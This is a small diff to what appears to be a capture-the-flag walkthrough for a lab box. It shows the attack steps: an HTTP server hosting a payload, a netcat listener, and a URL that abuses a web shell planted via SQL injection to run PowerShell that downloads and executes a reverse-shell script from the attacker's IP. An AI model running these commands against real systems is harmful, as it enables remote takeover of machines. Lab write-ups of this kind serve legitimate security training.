@@ -8,7 +8,7 @@ sudo python3 -m http.server 80
 ```
 sudo rlwrap nc -nvlp 443
 ```
-### 3. go to the updates url we created with the sqli injection and start that script (update ip if needed)
+### 3. go to the updates url we created with the sqli and start that script
 ```
 http://10.10.10.167/updates.php?c=powershell%20IEX(IWR%20http://10.10.14.39/Invoke-PowerShellTcp.ps1%20-UseBasicParsing)
 ```
